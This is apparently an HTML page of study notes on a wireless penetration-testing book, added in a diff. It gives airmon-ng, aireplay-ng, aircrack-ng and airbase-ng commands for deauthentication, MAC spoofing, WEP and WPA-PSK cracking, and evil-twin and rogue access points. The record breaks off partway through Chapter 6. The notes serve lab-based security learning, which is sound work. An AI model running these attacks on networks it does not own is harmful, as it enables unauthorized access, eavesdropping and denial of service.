@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+/*********************************************************************
+This is free and unencumbered software released into the public domain.
+
+Anyone is free to copy, modify, publish, use, compile, sell, or
+distribute this software, either in source code form or as a compiled
+binary, for any purpose, commercial or non-commercial, and by any
+means.
+
+For more information, please refer to <http://unlicense.org/>
+*********************************************************************/
+
+/*
+WiTeX
+https://github.com/AndrewBelt/WiTeX
+*/
+
+
+/* Latin Modern (LaTeX default) font */
+
+@font-face {
+	font-family: 'Latin Modern Roman';
+	font-weight: normal;
+	font-style: normal;
+	src: url('fonts/lmroman10-regular.woff') format('woff');
+}
+
+@font-face {
+	font-family: 'Latin Modern Roman';
+	font-weight: bold;
+	font-style: normal;
+	src: url('fonts/lmroman10-bold.woff') format('woff');
+}
+
+@font-face {
+	font-family: 'Latin Modern Roman';
+	font-weight: normal;
+	font-style: italic;
+	src: url('fonts/lmroman10-italic.woff') format('woff');
+}
+
+@font-face {
+	font-family: 'Latin Modern Roman';
+	font-weight: bold;
+	font-style: italic;
+	src: url('fonts/lmroman10-bolditalic.woff') format('woff');
+}
+
+/* Page Layout */
+
+body {
+  background-color: white;
+  font-size: 15pt;
+}
+
+body {
+	font-family: 'Latin Modern Roman', serif;
+}
+
+h1, h2, h3, h4, h5, h6 {
+	border: none;
+	font-weight: bold;
+}
+
+a, a:visited {
+	color: #a00;
+}
+
+ul {
+	list-style: disc;
+}
+
+/* Content Box */
+
+.content {
+	max-width: 720px;
+	margin: 2em auto;
+}
+
+.content > h1:first-child {
+	text-align: center;
+	display: block;
+}
+
+/* Article Body */
+
+.content {
+	text-align: justify;
+	-moz-hyphens: auto;
+	-webkit-hyphens: auto;
+	hyphens: auto;
+}
+
+dl dd {
+	/* center definitions (most useful for display equations) */
+	text-align: center;
+}
+
+code {
+	border-radius: 3px;
+	background-color: black;
+	color: white;
+	padding: 2px 3px;
+}
+</style>
+
+</head>
+<body>
+<ul>
+  <li><a href="#notes">Notes</a></li>
+  <li><a href="#chapter-1-wireless-lab-setup">Chapter 1: Wireless Lab Setup</a>
+  <ul>
+    <li><a href="#hardware-requirements">Hardware requirements</a></li>
+    <li><a href="#software-requirements">Software requirements</a></li>
+    <li><a href="#installing-backtrack">Installing BackTrack</a></li>
+    <li><a href="#setting-up-the-access-point">Setting up the access point</a></li>
+    <li><a href="#setting-up-the-wireless-card">Setting up the wireless card</a></li>
+    <li><a href="#connecting-to-the-access-point">Connecting to the access point</a></li>
+  </ul></li>
+  <li><a href="#chapter-2-wlan-and-its-its-inherent-insecurities">Chapter 2: WLAN and its Its Inherent Insecurities</a>
+  <ul>
+    <li><a href="#revisiting-wlan-frames">Revisiting WLAN frames</a></li>
+    <li><a href="#creating-a-monitor-mode-interface">Creating a monitor mode interface</a></li>
+    <li><a href="#sniffing-wireless-packets">Sniffing wireless packets</a></li>
+    <li><a href="#viewing-management-control-and-data-frames">Viewing Management, Control, and Data frames</a></li>
+    <li><a href="#sniffing-data-packets-for-our-network">Sniffing data packets for our network</a></li>
+    <li><a href="#packet-injection">Packet injection</a></li>
+    <li><a href="#important-note-on-wlan-sniffing-and-injection">Important note on WLAN sniffing and injection</a></li>
+    <li><a href="#experimenting-with-your-alfa-or-other-card">Experimenting with your Alfa (or other) card</a></li>
+    <li><a href="#role-of-regulatory-domains-in-wireless">Role of regulatory domains in wireless</a></li>
+    <li><a href="#experimenting-with-your-card">Experimenting with your card</a></li>
+  </ul></li>
+  <li><a href="#chapter-3-bypassing-wlan-authentication">Chapter 3: Bypassing WLAN Authentication</a>
+  <ul>
+    <li><a href="#hidden-ssids">Hidden SSIDs</a></li>
+    <li><a href="#uncovering-hidden-ssids">Uncovering hidden SSIDs</a></li>
+    <li><a href="#mac-filters">MAC filters</a></li>
+    <li><a href="#beating-mac-filters">Beating MAC filters</a></li>
+    <li><a href="#open-authentication">Open Authentication</a></li>
+    <li><a href="#bypassing-open-authentication">Bypassing Open Authentication</a></li>
+    <li><a href="#shared-key-authentication">Shared Key Authentication</a></li>
+    <li><a href="#bypassing-shared-authentication">Bypassing Shared Authentication</a></li>
+  </ul></li>
+  <li><a href="#chapter-4-wlan-encryption-flaws">Chapter 4: WLAN Encryption Flaws</a>
+  <ul>
+    <li><a href="#wlan-encryption">WLAN encryption</a></li>
+    <li><a href="#wep-encryption">WEP encryption</a></li>
+    <li><a href="#wpawpa2">WPA/WPA2</a></li>
+    <li><a href="#cracking-wpa-psk-weak-passphrase">Cracking WPA-PSK weak passphrase</a></li>
+    <li><a href="#speeding-up-wpawpa2-psk-cracking">Speeding up WPA/WPA2 PSK cracking</a></li>
+    <li><a href="#decrypting-wep-and-wpa-packets">Decrypting WEP and WPA packets</a></li>
+    <li><a href="#connecting-to-wep-and-wpa-networks">Connecting to WEP and WPA networks</a>
+    <ul>
+      <li><a href="#wep">WEP</a></li>
+      <li><a href="#wpa">WPA</a></li>
+    </ul></li>
+  </ul></li>
+  <li><a href="#chapter-5-attacks-on-the-wlan-infrastructure">Chapter 5: Attacks on the WLAN Infrastructure</a>
+  <ul>
+    <li><a href="#default-accounts-and-credentials-on-the-access-point">Default accounts and credentials on the access point</a></li>
+    <li><a href="#denial-of-service-attacks">Denial of service attacks</a></li>
+    <li><a href="#de-auth-dos-attack">De-Auth DoS attack</a></li>
+    <li><a href="#evil-twin-and-access-point-mac-spoofing">Evil twin and access point MAC spoofing</a></li>
+    <li><a href="#evil-twin-with-mac-spoofing">Evil twin with MAC spoofing</a></li>
+    <li><a href="#rogue-access-point">Rogue access point</a></li>
+    <li><a href="#rogue-access-point-2">Rogue access point</a></li>
+  </ul></li>
+  <li><a href="#chapter-6-attacking-the-client">Chapter 6: Attacking the Client</a>
+  <ul>
+    <li><a href="#honeypot-and-mis-association-attacks">Honeypot and Mis-Association attacks</a></li>
+    <li><a href="#orchestrating-a-mis-association-attack">Orchestrating a mis-association attack</a></li>
+    <li><a href="#caffe-latte-attack">Caffe Latte attack</a></li>
+    <li><a href="#conducting-the-caffe-latte-attack">Conducting the Caffe Latte attack</a></li>
+    <li><a href="#de-authentication-and-dis-association-attacks">De-Authentication and Dis-Association attacks</a></li>
+    <li><a href="#de-authenticating-the-client">De-Authenticating the client</a></li>
+    <li><a href="#dis-association-attack-on-the-client">Dis-Association attack on the client</a></li>
+    <li><a href="#hirte-attack">Hirte attack</a></li>
+    <li><a href="#ap-less-wpa-personal-cracking">AP-less WPA-Personal cracking</a></li>
+    <li><a href="#ap-less-wpa-cracking">AP-less WPA cracking</a></li>
+  </ul></li>
+  <li><a href="#chapter-7-advanced-wlan-attacks">Chapter 7: Advanced WLAN Attacks</a>
+  <ul>
+    <li><a href="#man-in-the-middle-attack">Man-in-the-Middle attack</a></li>
+    <li><a href="#man-in-the-middle-attack-2">Man-in-the-Middle attack</a></li>
+    <li><a href="#man-in-the-middle-over-pure-wireless">Man-in-the-Middle over pure wireless</a></li>
+    <li><a href="#wireless-eavesdropping-using-mitm">Wireless Eavesdropping using MITM</a></li>
+    <li><a href="#wireless-eavesdropping">Wireless eavesdropping</a></li>
+    <li><a href="#session-hijacking-over-wireless">Session Hijacking over wireless</a></li>
+    <li><a href="#session-hijacking-over-wireless-2">Session hijacking over wireless</a></li>
+    <li><a href="#finding-security-configurations-on-the-client">Finding security configurations on the client</a></li>
+    <li><a href="#enumerating-wireless-security-profiles">Enumerating wireless security profiles</a></li>
+  </ul></li>
+  <li><a href="#chapter-8-attacking-wpa-enterprise-and-radius">Chapter 8: Attacking WPA-Enterprise and RADIUS</a>
+  <ul>
+    <li><a href="#setting-up-freeradius">Setting up FreeRadius</a></li>
+  </ul></li>
+</ul>
+<h1 id="notes">Notes</h1>
+
+<p>This book was written for BackTrack, but it's fully
+compatible with Kali Linux.</p>
+
+<h1 id="chapter-1-wireless-lab-setup">Chapter 1: Wireless Lab Setup</h1>
+
+<h2 id="hardware-requirements">Hardware requirements</h2>
+
+<ul>
+<li>Two machines with internal Wi-Fi cards</li>
+<li>Both should have at least 3GB of RAM</li>
+<li>An Alfa wireless adapter or an equivalent which:
+<ul>
+<li>Supports packet injection</li>
+<li>Supports packet sniffing</li>
+<li>Is supported by BackTrack</li>
+</ul></li>
+<li>An access point which
+<ul>
+<li>Supports WEP/WPA/WPA2</li>
+</ul></li>
+<li>An internet connection</li>
+</ul>
+
+<h2 id="software-requirements">Software requirements</h2>
+
+<ul>
+<li>BackTrack 5 (or Kali Linux)</li>
+<li>Windows XP/Vista/7</li>
+</ul>
+
+<h2 id="installing-backtrack">Installing BackTrack</h2>
+
+<p>This is fairly obvious and has been documented in
+countless places on the web, so I won't dwell on this.</p>
+
+<h2 id="setting-up-the-access-point">Setting up the access point</h2>
+
+<ul>
+<li>Enter the IP address of the access point
+configuration terminal in your
+browser</li>
+<li>This is usually the gateway IP address returned by
+the <code>route -n</code> or <code>ip route</code> command</li>
+<li>Explore the various settings</li>
+<li>Change the <strong>SSID</strong> to "Wireless Lab"</li>
+<li>Change the <strong>authentication</strong> to <strong>Open
+Authentication</strong></li>
+<li>Save changes and reboot the access point, if required</li>
+</ul>
+
+<h2 id="setting-up-the-wireless-card">Setting up the wireless card</h2>
+
+<ul>
+<li>If it's an external one, plug it in</li>
+<li>Type:
+<ul>
+<li><code>iwconfig</code> -> lists all interfaces</li>
+<li><code>ifconfig wlan0 up</code> -> activates interface wlan0</li>
+<li><code>ifconfig wlan0</code> -> checks wlan0's status</li>
+</ul></li>
+</ul>
+
+<h2 id="connecting-to-the-access-point">Connecting to the access point</h2>
+
+<ul>
+<li>Type <code>iwlist wlan0 scanning</code> to find networks in your
+vicinity
+<ul>
+<li>ESSID is the SSID aka name of the network</li>
+<li>SSIDs aren't unique, so compare MAC address with the
+one written underneath the access point or on its
+admin GUI</li>
+</ul></li>
+<li>Type <code>iwconfig wlan0 essid "Wireless Lab"</code> to connect</li>
+<li>Type <code>iwconfig wlan0</code> to check the status</li>
+<li>Assuming the access point's IP address is 192.168.0.1
+<ul>
+<li><code>ifconfig wlan0 192.168.0.2 netmask 255.255.255.0
+up</code></li>
+<li>ping 192.168.0.1 or arp -a to check MAC address</li>
+</ul></li>
+<li>You can check connection logs on the access point</li>
+</ul>
+
+<h1 id="chapter-2-wlan-and-its-its-inherent-insecurities">Chapter 2: WLAN and its Its Inherent Insecurities</h1>
+
+<h2 id="revisiting-wlan-frames">Revisiting WLAN frames</h2>
+
+<p>The book assumes you have a basic understanding of the
+protocol and the packet headers</p>
+
+<ul>
+<li>Three types of frames:</li>
+<li>Management frames
+<ul>
+<li>Authentication</li>
+<li>De-authentication</li>
+<li>Association Request</li>
+<li>Association Response</li>
+<li>Re-association Request</li>
+<li>Re-association Response</li>
+<li>Disassociation</li>
+<li>Beacon</li>
+<li>Probe Request</li>
+<li>Probe Response</li>
+</ul></li>
+<li>Control frames
+<ul>
+<li>Request to Send (RTS)</li>
+<li>Clear to Send (CTS)</li>
+<li>Acknowledgement (ACK)</li>
+</ul></li>
+<li>Data frames</li>
+</ul>
+
+<p>We will now use Wireshark. Alternatives to Wireshark
+are, for example, Airodump-NG, Tcpdump, and Tshark.</p>
+
+<p>Next, we'll create a monitor mode interface for
+promiscuous mode - a mode which allows a network card
+to capture <strong>any</strong> packets in the air, not just the <br />
+ones destined for it.</p>
+
+<h2 id="creating-a-monitor-mode-interface">Creating a monitor mode interface</h2>
+
+<ul>
+<li><code>iwconfig</code> to confirm that network card is detected
+and drivers
+are properly loaded</li>
+<li><code>ifconfig wlan0 up</code> to bring the card up - you should
+see UP in the second line of the output if it worked</li>
+<li><code>airmon-ng</code> and check if it detects wlan0</li>
+<li><code>airmon-ng start wlan0</code></li>
+<li><code>airmon-ng</code> again to check if mon0 was created</li>
+<li><code>ifconfig</code> should now display a new interface named
+mon0</li>
+</ul>
+
+<h2 id="sniffing-wireless-packets">Sniffing wireless packets</h2>
+
+<ul>
+<li><code>wireshark</code> to open Wireshark</li>
+<li>Once it's open click on the <strong>Capture | Interfaces</strong>
+sub-menu</li>
+<li>Start capturing on the mon0 interface</li>
+</ul>
+
+<h2 id="viewing-management-control-and-data-frames">Viewing Management, Control, and Data frames</h2>
+
+<ul>
+<li>To view Management frames, enter <code>wlan.fc.type == 0</code>
+in the filter</li>
+<li>Click <strong>Apply</strong></li>
+<li>To stop the packets from scrolling, click <strong>Stop</strong></li>
+<li><code>wlan.fc.type == 1</code> filter for Control Frames</li>
+<li><code>wlan.fc.type == 2</code> filter for Data frames</li>
+<li>To select sub-types:
+<ul>
+<li><code>wlan.fc.subtype</code> filter</li>
+<li>example for Beacon frames among all Management
+frames:
+<code>(wlan.fc.type == 0) &amp;&amp; (wlan.fc.subtype == 8)</code></li>
+<li>Or you can click on header field and select <strong>Apply as
+Filter | Selected</strong></li>
+</ul></li>
+</ul>
+
+<h2 id="sniffing-data-packets-for-our-network">Sniffing data packets for our network</h2>
+
+<ul>
+<li>Set your access point to use no encryption</li>
+<li><code>airodump-ng --basid &lt;MAC address&gt; mon0</code>:
+find channel on which your access point is running</li>
+<li><code>iwconfig mon0 channel &lt;channel&gt;</code></li>
+<li><code>iwconfig mon0</code> to check</li>
+<li>Open Wireshark and start sniffing the mon0 interface</li>
+<li><code>wlan.bssid == &lt;MAC address&gt;</code> filter</li>
+<li><code>(lan.bssid == &lt;MAC address&gt;) &amp;&amp;
+(wlan.fc.type_subtype == 0x20)</code> filter for data packets</li>
+<li>Visit your access point's management URL to generate
+packets to capture</li>
+</ul>
+
+<h2 id="packet-injection">Packet injection</h2>
+
+<ul>
+<li><code>(wlan.bssid == 00:21:91:d2:8e:25) &amp;&amp;
+!(wlan.fc.type_subtype == 0x08)</code> for non-beacon</li>
+<li><code>aireplay-ng -9 -e Wireless Lab -a &lt;MAC&gt; mon0</code>
+to inject packets</li>
+</ul>
+
+<h2 id="important-note-on-wlan-sniffing-and-injection">Important note on WLAN sniffing and injection</h2>
+
+<ul>
+<li>WLANs operate at 2.4GHz, 3.6GHz, and 4.9/5.0GHz</li>
+<li>Not all Wi-Fi cards support all these ranges</li>
+<li>Each frequency rage has multiple channels</li>
+<li>A Wi-Fi card can only be on one channel at a time</li>
+</ul>
+
+<h2 id="experimenting-with-your-alfa-or-other-card">Experimenting with your Alfa (or other) card</h2>
+
+<ul>
+<li><code>iwconfig wlan0</code> to check available bands
+(802.11bgn)</li>
+<li><code>iwconfig mon0 channel &lt;channel number&gt;</code>
+to set channel</li>
+</ul>
+
+<h2 id="role-of-regulatory-domains-in-wireless">Role of regulatory domains in wireless</h2>
+
+<p>Each country has different laws for power levels
+and frequencies</p>
+
+<h2 id="experimenting-with-your-card">Experimenting with your card</h2>
+
+<ul>
+<li><code>iw reg set US</code> to set card to US standards</li>
+<li>/var/log/messages to check</li>
+<li><code>iwconfig wlan0 txpower &lt;dBm&gt;</code> to set transmit power</li>
+</ul>
+
+<h1 id="chapter-3-bypassing-wlan-authentication">Chapter 3: Bypassing WLAN Authentication</h1>
+
+<h2 id="hidden-ssids">Hidden SSIDs</h2>
+
+<ul>
+<li>By default, access points broadcast their SSIDs</li>
+<li>Hiding the SSID isn't that great for security</li>
+</ul>
+
+<h2 id="uncovering-hidden-ssids">Uncovering hidden SSIDs</h2>
+
+<ul>
+<li>Configure your access point to not broadcast its SSID</li>
+<li>Your access point will then stop sending Beacon frames</li>
+<li>Clients connecting to the network generate
+Probe Request and Probe response packets, containing
+the SSID</li>
+<li><code>aireplay-ng -0 5 -a &lt;MAC&gt; mon0</code>
+<ul>
+<li>-0: chooses Deauthentication attack</li>
+<li>5: number of Deauthentication packets to send</li>
+<li>-a: target access point's MAC address</li>
+<li>Forces all legitimate clients to disconnect and
+reconnect</li>
+<li>This will generate Probe Request and Response frames
+which contain the SSID</li>
+</ul></li>
+</ul>
+
+<h2 id="mac-filters">MAC filters</h2>
+
+<ul>
+<li>Used to be a good idea for wired connections</li>
+<li>Useless security measure for wireless networks</li>
+<li>Consists of maintaining a list of allowed MAC addresses
+at the access point</li>
+</ul>
+
+<h2 id="beating-mac-filters">Beating MAC filters</h2>
+
+<ul>
+<li>Add MAC filtering for your target machine on your
+access point</li>
+<li><code>airodump-ng -c 11 -a --bssid &lt;MAC&gt; mon0</code>
+<ul>
+<li>-a: only clients associated and connected are shown</li>
+<li>This will show us the MAC addresses of clients
+connected to that network</li>
+</ul></li>
+<li><code>macchanger -m &lt;MAC&gt; waln0</code>
+<ul>
+<li>Spoofs our MAC address</li>
+<li>-m: new spoofed address</li>
+</ul></li>
+</ul>
+
+<h2 id="open-authentication">Open Authentication</h2>
+
+<p>Open authentication authenticates all clients which
+connect. There's no authentication at all.</p>
+
+<h2 id="bypassing-open-authentication">Bypassing Open Authentication</h2>
+
+<ul>
+<li>Set your access point to use Open Authentication</li>
+<li><code>iwconfig wlan0 essid "Wireless Lab"</code> to connect</li>
+</ul>
+
+<h2 id="shared-key-authentication">Shared Key Authentication</h2>
+
+<ul>
+<li>Uses a shared secret such as the WEP key</li>
+<li>Flow
+<ul>
+<li>Client sends auth request to access point</li>
+<li>Access point responds with a challenge</li>
+<li>Client encrypts the challenge with the shared key and
+sends it back</li>
+<li>Access points decrypts it and checks if it matches</li>
+<li>If it matches, the client authenticates, else it sends
+an auth failed message</li>
+</ul></li>
+<li>An attacker can passively intercept the plain text
+challenge and the encrypted response</li>
+<li>XOR to retrieve keystream, which can be used to auth</li>
+</ul>
+
+<h2 id="bypassing-shared-authentication">Bypassing Shared Authentication</h2>
+
+<ul>
+<li>Set up Shared Authentication on your access point
+(WEP security mode and Shared Key auth)</li>
+<li>Connect a legitimate client to the network using the key</li>
+<li><code>airodump-ng mon0 -c 11 --bssid &lt;MAC&gt; -w keystream</code>
+<ul>
+<li>Logs the entire shared auth exchange</li>
+<li>-w: prefix of the file in which to store the packets</li>
+</ul></li>
+<li>You can also force a reconnect (discussed previously)</li>
+<li>Capture has succeeded if airodump-ng shows <strong>SKA</strong>
+in the <strong>AUTH</strong> column</li>
+<li>The keystream is stored in a file called <prefix><target
+mac address>.xor</li>
+<li><code>aireplay-ng -1 0 -e Wireless Lab -y
+keystream-01-00-21-91-D2-8E-25.xor -a 00:21:91:D2:8E:25 -h
+aa:aa:aa:aa:aa:aa mon0. aireplay-ng</code> to auth with the
+target access point</li>
+<li>Wireshark filter: <code>wlan.addr == aa:aa:aa:aa:aa:aa</code></li>
+<li>aireplay-ng lets us know if it succeeded</li>
+<li>Verifying with Wireshark
+<ul>
+<li>1st packet is the auth request sent by aireplay-ng</li>
+<li>2nd packet is the challenge text response sent by
+the access point</li>
+<li>3rd packet is the encrypted challenge sent by
+aireplay-ng</li>
+<li>4th packet is the success message sent by the access
+point</li>
+<li>After the auth, aireplay-ng fakes association with
+the access point</li>
+<li>The association can be verified in the access point's
+logs</li>
+<li>This can be used to DoS an access point since they
+have a max number of clients</li>
+</ul></li>
+</ul>
+
+<h1 id="chapter-4-wlan-encryption-flaws">Chapter 4: WLAN Encryption Flaws</h1>
+
+<ul>
+<li>WEP is broken to death</li>
+<li>WPA/WPA2 is much more secure</li>
+</ul>
+
+<h2 id="wlan-encryption">WLAN encryption</h2>
+
+<ul>
+<li>IEEE 802.11 standards:
+<ul>
+<li>Wired Equivalent Privacy (WEP - rip)</li>
+<li>WiFi Protected Access (WPA)</li>
+<li>WiFi Protection Access v2 (WPAv2)</li>
+</ul></li>
+</ul>
+
+<h2 id="wep-encryption">WEP encryption</h2>
+
+<ul>
+<li>Cracked even as early as 2000</li>
+<li><code>ifconfig wlan0 up</code></li>
+<li><code>airmon-ng start wlan0</code> to create <code>mon0</code></li>
+<li><code>iwconfig</code> to verify mon0 was created</li>
+<li><code>airodump-ng mon0</code> to find the wireless network</li>
+<li><code>airodump=ng -bbssid &lt;Access point's MAC&gt; --channel &lt;AP's
+channel&gt; --write WEPCrackingDemo mon0</code> sniffs and saves
+packets of target AP</li>
+<li>In the AUTH column, you should see SKA once a client
+connects.</li>
+<li>To capture more packets we will capture ARP packets
+and inject them back to simulate ARP responses</li>
+<li>In a separate terminal:
+<ul>
+<li><code>aireplay-ng -3 -b &lt;AP's MAC&gt; -h &lt;MAC&gt;</code> -3: ARP replay, -b:
+our network's BSSID, -h: spoofed client's MAC</li>
+<li>Only works for authenticated and associated MAC addresses</li>
+</ul></li>
+<li>In a separate window, start cracking the WEP key:
+<ul>
+<li><code>aircrack-ng WEPCracking WEPCrackingDemo-01.cap</code></li>
+<li>Wait 5-10 minutes while still running airodump-ng
+and aireplay-ng in the background</li>
+<li>Once key is found, aircrack-ng displays it and exits</li>
+</ul></li>
+<li>Even if client leaves during the process, the fake
+authentication and association using Shared Key Auth bypassing
+(discussed earlier) should do the deal</li>
+</ul>
+
+<h2 id="wpawpa2">WPA/WPA2</h2>
+
+<ul>
+<li>WPA (= WPA v1) uses TKIP encryption</li>
+<li>WPA2 uses AES-CCMP encryption</li>
+<li>Both allow:
+<ul>
+<li>EAP auth (Enterprise - Radius servers)</li>
+<li>Pre-Shared Key (PSK) (Personal)</li>
+</ul></li>
+<li>WPA/WPA2 PSK is vulnerable to dictionary attacks</li>
+<li>Per-session key (Pairwuse Transient Key - PTK) derived
+using the PSK, network SSID, Authenticator Nounce (ANounce),
+Supplicant Nounce (SNounce), AP MAC, and Wi-Fi Client MAC</li>
+<li>PTK encrypts data between AP and client</li>
+<li>Everything can be eavesdropped over the air except for
+the PSK</li>
+<li>Cracking WPA-PSK this way works the same way for WPA2-PSK</li>
+</ul>
+
+<h2 id="cracking-wpa-psk-weak-passphrase">Cracking WPA-PSK weak passphrase</h2>
+
+<ul>
+<li><code>airodump-ng -bssid &lt;AP BSSID&gt; -channel &lt;AP channel&gt;
+-write WPACrackingDemo mon0</code></li>
+<li>Wait or force client to reconnect:
+<ul>
+<li><code>aireplay-ng --deauth 1 -a &lt;AP BSSID&gt; mon0</code></li>
+</ul></li>
+<li>As soon as WPA handshake is captured, it will show on the
+top right corner, followed by the AP's BSSID</li>
+<li>Stop airodump-ng</li>
+<li>Now we'll use dictionaries. These comes in all flavors,
+Backtrack/Kali ships with some, but it's best to
+find your own.</li>
+<li><code>aircrack-ng WPACrackingDemo-01.cap -w
+/pentest/passwords/wordlists/darkc0de.lst</code></li>
+<li>If the key is in the dictionary, aircrack-ng will show the
+key and then exit</li>
+<li>Cowpatty is another good WPA/WPA2 cracking tool</li>
+</ul>
+
+<h2 id="speeding-up-wpawpa2-psk-cracking">Speeding up WPA/WPA2 PSK cracking</h2>
+
+<ul>
+<li>Pre-calculate the PMK for a given SSID and wordlist</li>
+<li><code>genpmk -f &lt;path to dictionary&gt; -d &lt;output file&gt; -s
+"&lt;SSID&gt;"</code></li>
+<li><code>cowpatty -d &lt;file created by genpmk&gt; -s &lt;SSID&gt; -r &lt;cap
+file&gt;</code> to crack. This takes mere seconds.</li>
+<li>To do the same with aircrack-ng:
+<ul>
+<li><code>airolib-ng &lt;output file&gt; --import cowpatty &lt;file created
+by genpmk&gt;</code></li>
+<li><code>aircrack-ng -r &lt;file created by airolib-ng&gt; &lt;cap file&gt;</code></li>
+</ul></li>
+<li>There's other tools available too, like Pyrit:
+<ul>
+<li><code>pyrit -r &lt;cap file&gt; -i &lt;file created by genpmk&gt;
+attack_cowpatty</code></li>
+</ul></li>
+</ul>
+
+<h2 id="decrypting-wep-and-wpa-packets">Decrypting WEP and WPA packets</h2>
+
+<ul>
+<li><code>airdecap-ng -w &lt;WEP key&gt; &lt;cap file&gt;</code></li>
+<li>Decrypted files are stored in <cap file name>-dec.cap</li>
+<li><code>tshark -r &lt;decrypted cap file&gt; -c 10</code> to view first 10
+packets in the terminal</li>
+<li>For WPA:
+<ul>
+<li><code>airdecap-ng -p &lt;PSK&gt; &lt;cap file&gt; -e "&lt;SSID&gt;"</code></li>
+</ul></li>
+</ul>
+
+<h2 id="connecting-to-wep-and-wpa-networks">Connecting to WEP and WPA networks</h2>
+
+<h3 id="wep">WEP</h3>
+
+<ul>
+<li><code>iwconfig wlan0 essid &lt;SSID&gt; key &lt;WEP key&gt;</code></li>
+<li><code>iwconfig wlan0</code> to check</li>
+</ul>
+
+<h3 id="wpa">WPA</h3>
+
+<ul>
+<li>iwconfig doesn't support WPA/WPA2</li>
+<li>We'll use <code>WPA_supplicant</code></li>
+<li>Create <code>wpa-supp.conf</code> file:</li>
+</ul>
+
+<pre><code># WPA-PSK/TKIP
+
+network={
+    ssid=&lt;SSID&gt;
+    key_mgmt=WPA-PSK
+    proto=WPA
+    pairwise=TKIP
+    group=TKIP
+    psk="&lt;PSK&gt;"
+}
+</code></pre>
+
+<ul>
+<li><p><code>wpa_supplicant -Dwext -iwlan0 -c wpa-supp.conf</code></p></li>
+<li><p>Once connected for WEP or WPA/WPA2, use <code>dhclient3 wlan0</code>
+to grab DHCP address from the network</p></li>
+</ul>
+
+<h1 id="chapter-5-attacks-on-the-wlan-infrastructure">Chapter 5: Attacks on the WLAN Infrastructure</h1>
+
+<ul>
+<li>Various attacks against the WLAN infrastructure:
+<ul>
+<li>Default accounts and credentials on AP</li>
+<li>DoS attacks</li>
+<li>Evil twin and AP MAC spoofing</li>
+<li>Rogue APs</li>
+</ul></li>
+</ul>
+
+<h2 id="default-accounts-and-credentials-on-the-access-point">Default accounts and credentials on the access point</h2>
+
+<ul>
+<li>We'll check if default passwords have been changed
+on the AP</li>
+<li>If not, use google to find default username &amp; pass</li>
+<li>Else, use Hydra or something similar to bruteforce through
+HTTP auth</li>
+</ul>
+
+<h2 id="denial-of-service-attacks">Denial of service attacks</h2>
+
+<ul>
+<li>Possible techniques:
+<ul>
+<li>De-auth attack</li>
+<li>Dis-association attack</li>
+<li>CTS-RTS attack</li>
+<li>Signal interference or spectrum jamming attack</li>
+</ul></li>
+</ul>
+
+<h2 id="de-auth-dos-attack">De-Auth DoS attack</h2>
+
+<ul>
+<li>Run airodump to detect connecting clients</li>
+<li><code>aireplay-ng --deauth 1 -a &lt;AP BSSID&gt; -h &lt;AP BSSID&gt; -c
+&lt;client MAC&gt; mon0</code></li>
+<li><code>aireplay-ng --deauth 0 -a &lt;AP BSSID&gt; -h &lt;AP BSSID&gt; mon0</code> to
+send a Broadcast De-Auth packet (to all connected clients)</li>
+<li>Use this repeatedly to totally deny access to a network</li>
+</ul>
+
+<h2 id="evil-twin-and-access-point-mac-spoofing">Evil twin and access point MAC spoofing</h2>
+
+<ul>
+<li>Users get tricked by another AP using the same SSID as the
+legitimate AP. It gets worse if the twin AP also mirrors
+the other's MAC by spoofing it.</li>
+</ul>
+
+<h2 id="evil-twin-with-mac-spoofing">Evil twin with MAC spoofing</h2>
+
+<ul>
+<li><code>airodump-ng</code> to get BSSID and ESSID</li>
+<li><code>airbase-ng -a AA:AA:AA:AA:AA:AA --essid "&lt;ESSID&gt; -c 11
+mon0"</code> to copy ESSID (yet not the BSSID and MAC)</li>
+<li>run airdump-ng again to see the new network</li>
+<li><code>aireplay-ng --deauth 0 -a &lt;AP BSSID&gt; mon0</code> to make the
+clients disconnect and connect to the twin AP (assuming the
+twin AP's signal is stronger because the AP is closer)</li>
+<li>To spoof BSSID and MAC for the access point:
+<ul>
+<li><code>airbase-ng -a &lt;BSSID&gt; --essid "&lt;ESSID&gt;" -c 11 mon0</code></li>
+<li>Now if you run airodump-ng, it won't even be able to
+distinguish the two networks</li>
+</ul></li>
+</ul>
+
+<h2 id="rogue-access-point">Rogue access point</h2>
+
+<ul>
+<li>It's an unauthorized AP connected to an authorized network</li>
+<li>Used as a backdoor to bypass all security controls on the
+network</li>
+<li>Done in two ways:
+<ul>
+<li>Physically set up and connect to the authorized network</li>
+<li>Create in software and bridge with the local authorized
+network. Allows any laptop running on the authorized
+network to become a rogue AP</li>
+</ul></li>
+</ul>
+
+<h2 id="rogue-access-point-2">Rogue access point</h2>
+
+<ul>
+<li><code>airbase-ng --essid Rogue -c 11 mon0</code> to create an AP</li>
+<li><code>brctl addbr Wifi-Bridge</code> to create bridge between
+the Ethernet Interface (authorized network) and the rogue
+AP</li>
+<li><code>brctl addif Wifi-Bridge eth0</code></li>
+<li><code>brctl addif Wifi-Bridge at0</code> (at0 is the interface created
+by airbase)</li>
+<li><code>ifconfig eth0 0.0.0.0 up</code></li>
+<li><code>ifconfig at0 0.0.0.0 up</code></li>
+<li><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> to enable
+IP forwarding in the kernel</li>
+</ul>
+
+<h1 id="chapter-6-attacking-the-client">Chapter 6: Attacking the Client</h1>
+
+<ul>
+<li>Shifting focus on client:
+<ul>
+<li>Honeypot and mis-association attacks</li>
+<li>Caffe latte attack</li>
+<li>De-auth and dis-association attacks</li>
+<li>Hirte attack</li>
+<li>AP-less WPA-Personal cracking</li>
+</ul></li>
+</ul>
+
+<h2 id="honeypot-and-mis-association-attacks">Honeypot and Mis-Association attacks</h2>
+
+<ul>
+<li>When a machine is turned on, it usually probes for the
+networks it previously connected to. It will display any
+networks available in its range</li>
+<li>Two choices:
+<ul>
+<li>Silently monitor the probe and bring up a fake AP
+with the ESSID the client is searching for</li>
+<li>Create fake APs with same ESSIDs as the neighbouring ones</li>
+</ul></li>
+</ul>
+
+<h2 id="orchestrating-a-mis-association-attack">Orchestrating a mis-association attack</h2>
+
+<ul>
+<li><code>airdumo-ng mon0</code> to check clients</li>
+<li>Clients not connected to an AP will be shown probing in most
+cases</li>
+<li>Fire up Wireshark on mon0 and filter for Probe Request
+packets from the specific client MAC
+<ul>
+<li><code>wlan.fc.type_subtype == 0x04 &amp;&amp; wlan.sa == &lt;client MAC&gt;</code></li>
+</ul></li>
+<li><code>airbase-ng --essid "&lt;ESSID&gt; -c 3 mon0"</code> to launch the
+fake AP</li>
+<li>Client will connect to the fake AP</li>
+<li>To make a fake AP while existing one is running:
+<ul>
